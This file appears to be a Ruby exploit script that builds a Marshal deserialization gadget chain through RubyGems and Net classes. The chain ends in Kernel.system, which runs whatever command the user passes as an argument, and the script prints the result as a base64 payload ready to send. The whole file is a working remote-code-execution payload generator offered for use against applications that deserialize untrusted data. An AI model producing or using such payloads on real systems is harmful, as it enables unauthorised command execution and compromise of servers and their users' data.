require 'base64'
require 'rubygems'

# ==== Uso ====
# ruby exploit.rb "command"
# ===================

if ARGV.empty?
  puts "[-] Use: ruby #{__FILE__} \"command\""
  exit
end

changeme_value = ARGV[0]

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# Prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', changeme_value)

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

puts "[+] Base64 encoded payload: #{Base64.strict_encode64(payload)}\n\n"
puts "[+] Marshal payload: #{payload.inspect}\n\n"

